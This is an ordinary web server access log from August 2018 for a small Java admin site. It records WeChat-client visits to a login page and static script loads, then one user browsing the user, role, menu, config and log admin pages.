61.151.225.241 - - [22/Aug/2018:02:42:11 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.27.400 QQBrowser/9.0.2524.400" "-"
61.151.225.241 - - [22/Aug/2018:02:42:12 +0000] "GET /login.html;JSESSIONID=79ae4a03-8a72-4119-887d-501ad5747ec0 HTTP/1.1" 200 4135 "http://47.92.143.230/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.27.400 QQBrowser/9.0.2524.400" "-"
61.151.225.241 - - [22/Aug/2018:02:42:14 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=79ae4a03-8a72-4119-887d-501ad5747ec0" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/zh_CN" "-"
61.151.178.165 - - [22/Aug/2018:02:42:18 +0000] "GET /?nsukey=voa%2B0qIfUVVu01CITHwzox2wW%2BpIpYxIbJ2%2BUZ4lHkHGeyBgh1RYiGyfjXbphLVO5T3oylRiEf%2FngsDlWPEi85VoOCPXWKl7Hfg%2Fv9rQNTOMWCOLnrV3X%2BtoHNhQyiR%2BaRZ8OiD2fTbjHahcYZi4MlBixJL%2FguyUHa%2B0a%2FVnlwmMJPGYgPaUhXcKE%2FeCNrxqSM9MjOKE9dHflMqK2yuQeA%3D%3D HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.225.241 - - [22/Aug/2018:02:42:19 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=79ae4a03-8a72-4119-887d-501ad5747ec0" "Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI ALE-CL00 Build/HuaweiALE-CL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.178.165 - - [22/Aug/2018:02:42:20 +0000] "GET /login.html;JSESSIONID=97df8663-4813-4486-81ee-26c8a6516e97 HTTP/1.1" 200 4135 "http://47.92.143.230/?nsukey=voa%2B0qIfUVVu01CITHwzox2wW%2BpIpYxIbJ2%2BUZ4lHkHGeyBgh1RYiGyfjXbphLVO5T3oylRiEf%2FngsDlWPEi85VoOCPXWKl7Hfg%2Fv9rQNTOMWCOLnrV3X%2BtoHNhQyiR%2BaRZ8OiD2fTbjHahcYZi4MlBixJL%2FguyUHa%2B0a%2FVnlwmMJPGYgPaUhXcKE%2FeCNrxqSM9MjOKE9dHflMqK2yuQeA%3D%3D" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.225.241 - - [22/Aug/2018:02:42:21 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=79ae4a03-8a72-4119-887d-501ad5747ec0" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.225.241 - - [22/Aug/2018:02:42:21 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=79ae4a03-8a72-4119-887d-501ad5747ec0" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.27.400 QQBrowser/9.0.2524.400" "-"
61.151.225.241 - - [22/Aug/2018:02:42:22 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=79ae4a03-8a72-4119-887d-501ad5747ec0" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.27.400 QQBrowser/9.0.2524.400" "-"
61.151.225.241 - - [22/Aug/2018:02:42:22 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=79ae4a03-8a72-4119-887d-501ad5747ec0" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.178.165 - - [22/Aug/2018:02:42:24 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=97df8663-4813-4486-81ee-26c8a6516e97" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.27.400 QQBrowser/9.0.2524.400" "-"
61.151.225.135 - - [22/Aug/2018:02:42:40 +0000] "GET /?nsukey=qJOus4v9mYai%2B3fnHOM3k5cco3plahdLz7bnm2vrw%2FKkdj8S%2BcH44XTSM38SxGhjTyMWNzCzrliLYZbdBUYNdc2OGwpfGfy5Ei8%2BsXXDN471bnYLaHraef9YQb6nb5ftdB3wCRVAXkBtUYiT9r02tYYTw73vr0hOT1Jv2b2cEjypllPuTgseY3W0zAGChiSUjsMltz8w%2BBMN9RpqVcZU2w%3D%3D HTTP/1.1" 302 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en" "-"
61.151.225.135 - - [22/Aug/2018:02:42:40 +0000] "GET /login.html;JSESSIONID=783adb8f-179f-4c8b-9e8a-c44963d68a87 HTTP/1.1" 200 4135 "http://47.92.143.230/?nsukey=qJOus4v9mYai%2B3fnHOM3k5cco3plahdLz7bnm2vrw%2FKkdj8S%2BcH44XTSM38SxGhjTyMWNzCzrliLYZbdBUYNdc2OGwpfGfy5Ei8%2BsXXDN471bnYLaHraef9YQb6nb5ftdB3wCRVAXkBtUYiT9r02tYYTw73vr0hOT1Jv2b2cEjypllPuTgseY3W0zAGChiSUjsMltz8w%2BBMN9RpqVcZU2w%3D%3D" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en" "-"
61.129.8.179 - - [22/Aug/2018:02:42:41 +0000] "GET /?nsukey=qJOus4v9mYai%2B3fnHOM3k5cco3plahdLz7bnm2vrw%2FKkdj8S%2BcH44XTSM38SxGhjTyMWNzCzrliLYZbdBUYNdc2OGwpfGfy5Ei8%2BsXXDN471bnYLaHraef9YQb6nb5ftdB3wCRVAXkBtUYiT9r02tYYTw73vr0hOT1Jv2b2cEjypllPuTgseY3W0zAGChiSUjsMltz8w%2BBMN9RpqVcZU2w%3D%3D HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36" "-"
61.129.8.179 - - [22/Aug/2018:02:42:41 +0000] "GET /login.html;JSESSIONID=cb6ecd7f-13d7-430f-b112-95da302613be HTTP/1.1" 200 4135 "http://47.92.143.230/?nsukey=qJOus4v9mYai%2B3fnHOM3k5cco3plahdLz7bnm2vrw%2FKkdj8S%2BcH44XTSM38SxGhjTyMWNzCzrliLYZbdBUYNdc2OGwpfGfy5Ei8%2BsXXDN471bnYLaHraef9YQb6nb5ftdB3wCRVAXkBtUYiT9r02tYYTw73vr0hOT1Jv2b2cEjypllPuTgseY3W0zAGChiSUjsMltz8w%2BBMN9RpqVcZU2w%3D%3D" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36" "-"
61.151.225.135 - - [22/Aug/2018:02:42:41 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=783adb8f-179f-4c8b-9e8a-c44963d68a87" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.129.8.179 - - [22/Aug/2018:02:42:42 +0000] "GET /statics/libs/jquery.min.js HTTP/1.1" 200 85578 "http://47.92.143.230/login.html;JSESSIONID=cb6ecd7f-13d7-430f-b112-95da302613be" "Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko)     \x09\x09Chrome/46.0.2490.11 Mobile Safari/537.36" "-"
61.151.225.135 - - [22/Aug/2018:02:42:43 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=783adb8f-179f-4c8b-9e8a-c44963d68a87" "Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI ALE-CL00 Build/HuaweiALE-CL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.225.135 - - [22/Aug/2018:02:42:43 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=783adb8f-179f-4c8b-9e8a-c44963d68a87" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat QBCore/3.43.27.400 QQBrowser/9.0.2524.400" "-"
61.129.8.179 - - [22/Aug/2018:02:42:44 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=cb6ecd7f-13d7-430f-b112-95da302613be" "Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko)     \x09\x09Chrome/46.0.2490.11 Mobile Safari/537.36" "-"
61.151.225.135 - - [22/Aug/2018:02:42:44 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=783adb8f-179f-4c8b-9e8a-c44963d68a87" "Mozilla/5.0 (Linux; Android 4.4.4; Coolpad Y82-520 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.225.135 - - [22/Aug/2018:02:42:44 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=783adb8f-179f-4c8b-9e8a-c44963d68a87" "Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI ALE-CL00 Build/HuaweiALE-CL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.225.135 - - [22/Aug/2018:02:42:44 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=783adb8f-179f-4c8b-9e8a-c44963d68a87" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en" "-"
61.129.8.179 - - [22/Aug/2018:02:42:44 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=cb6ecd7f-13d7-430f-b112-95da302613be" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36" "-"
61.129.8.179 - - [22/Aug/2018:02:42:45 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=cb6ecd7f-13d7-430f-b112-95da302613be" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30" "-"
61.129.8.179 - - [22/Aug/2018:02:42:46 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=cb6ecd7f-13d7-430f-b112-95da302613be" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
61.151.178.165 - - [22/Aug/2018:02:42:46 +0000] "GET /statics/libs/vue.min.js HTTP/1.1" 200 76666 "http://47.92.143.230/login.html;JSESSIONID=97df8663-4813-4486-81ee-26c8a6516e97" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/zh_CN" "-"
61.129.8.179 - - [22/Aug/2018:02:42:47 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=cb6ecd7f-13d7-430f-b112-95da302613be" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.0.0 Mobile Safari/537.36 OppoBrowser/4.2.8" "-"
61.151.178.165 - - [22/Aug/2018:02:42:58 +0000] "GET /statics/libs/bootstrap.min.js HTTP/1.1" 200 37045 "http://47.92.143.230/login.html;JSESSIONID=97df8663-4813-4486-81ee-26c8a6516e97" "Mozilla/5.0 (Linux; Android 4.4.4; Coolpad Y82-520 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.178.165 - - [22/Aug/2018:02:43:04 +0000] "GET /statics/libs/jquery.slimscroll.min.js HTTP/1.1" 200 6230 "http://47.92.143.230/login.html;JSESSIONID=97df8663-4813-4486-81ee-26c8a6516e97" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en" "-"
61.151.178.165 - - [22/Aug/2018:02:43:09 +0000] "GET /statics/libs/fastclick.min.js HTTP/1.1" 200 8776 "http://47.92.143.230/login.html;JSESSIONID=97df8663-4813-4486-81ee-26c8a6516e97" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.9 TBS/036906 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
61.151.178.165 - - [22/Aug/2018:02:43:15 +0000] "GET /statics/libs/app.js HTTP/1.1" 200 22941 "http://47.92.143.230/login.html;JSESSIONID=97df8663-4813-4486-81ee-26c8a6516e97" "Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043024 Safari/537.36 MicroMessenger/6.5.4.1000 NetType/4G Language/zh_CN" "-"
123.125.250.164 - - [22/Aug/2018:02:45:53 +0000] "GET / HTTP/1.1" 200 5376 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:53 +0000] "GET /sys/user/info?_1534905953487 HTTP/1.1" 200 179 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:53 +0000] "GET /sys/menu/user?_1534905953486 HTTP/1.1" 200 1499 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:53 +0000] "GET /sys/main.html HTTP/1.1" 200 139 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:58 +0000] "GET /sys/user.html HTTP/1.1" 200 3834 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:58 +0000] "GET /statics/plugins/jqgrid/ui.jqgrid-bootstrap.css HTTP/1.1" 200 18291 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:58 +0000] "GET /statics/plugins/ztree/css/metroStyle/metroStyle.css HTTP/1.1" 200 6576 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:58 +0000] "GET /statics/plugins/jqgrid/grid.locale-cn.js HTTP/1.1" 200 9369 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:58 +0000] "GET /statics/plugins/ztree/jquery.ztree.all.min.js HTTP/1.1" 200 63404 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:58 +0000] "GET /js/common.js HTTP/1.1" 200 1634 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:58 +0000] "GET /js/sys/user.js?_1534905958162 HTTP/1.1" 200 3406 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:58 +0000] "GET /statics/plugins/jqgrid/jquery.jqGrid.min.js HTTP/1.1" 200 334710 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:45:59 +0000] "GET /sys/user/list?_search=false&nd=1534905959025&limit=10&page=1&sidx=&order=asc&_=1534905958281 HTTP/1.1" 200 400 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:20 +0000] "GET /sys/role.html HTTP/1.1" 200 2905 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:20 +0000] "GET /js/sys/role.js?_1534905980447 HTTP/1.1" 200 3886 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:20 +0000] "GET /sys/role/list?_search=false&nd=1534905980527&limit=10&page=1&sidx=&order=asc&_=1534905980484 HTTP/1.1" 200 85 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:21 +0000] "GET /sys/menu.html HTTP/1.1" 200 4366 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:21 +0000] "GET /js/sys/menu.js?_1534905981434 HTTP/1.1" 200 4467 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:21 +0000] "GET /sys/menu/list?_search=false&nd=1534905981566&limit=10&page=1&sidx=&order=asc&_=1534905981525 HTTP/1.1" 200 1828 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:22 +0000] "GET /sys/config.html HTTP/1.1" 200 2922 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:22 +0000] "GET /js/sys/config.js?_1534905982478 HTTP/1.1" 200 2695 "http://47.92.143.230/sys/config.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:22 +0000] "GET /sys/config/list?_search=false&nd=1534905982549&limit=10&page=1&sidx=&order=asc&_=1534905982516 HTTP/1.1" 200 85 "http://47.92.143.230/sys/config.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:24 +0000] "GET /sys/log.html HTTP/1.1" 200 1502 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:24 +0000] "GET /js/sys/log.js?_1534905984649 HTTP/1.1" 200 1597 "http://47.92.143.230/sys/log.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:24 +0000] "GET /sys/log/list?_search=false&nd=1534905984762&limit=10&page=1&sidx=&order=asc&_=1534905984706 HTTP/1.1" 200 871 "http://47.92.143.230/sys/log.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:25 +0000] "GET /sys/generator.html HTTP/1.1" 200 1564 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:25 +0000] "GET /js/sys/generator.js?_1534905985543 HTTP/1.1" 200 1548 "http://47.92.143.230/sys/generator.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:26 +0000] "GET /sys/generator/list?_search=false&nd=1534905985604&limit=10&page=1&sidx=&order=asc&_=1534905985574 HTTP/1.1" 200 884 "http://47.92.143.230/sys/generator.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:51 +0000] "GET /sys/user.html HTTP/1.1" 200 3834 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:51 +0000] "GET /js/sys/user.js?_1534906011612 HTTP/1.1" 200 3406 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:51 +0000] "GET /sys/user/list?_search=false&nd=1534906011679&limit=10&page=1&sidx=&order=asc&_=1534906011644 HTTP/1.1" 200 400 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:52 +0000] "GET /sys/role.html HTTP/1.1" 200 2905 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:52 +0000] "GET /js/sys/role.js?_1534906012598 HTTP/1.1" 200 3886 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:52 +0000] "GET /sys/role/list?_search=false&nd=1534906012664&limit=10&page=1&sidx=&order=asc&_=1534906012630 HTTP/1.1" 200 85 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:54 +0000] "GET /sys/menu.html HTTP/1.1" 200 4366 "http://47.92.143.230/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [22/Aug/2018:02:46:54 +0000] "GET /js/sys/menu.js?_1534906014288 HTTP/1.1" 200 4467 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
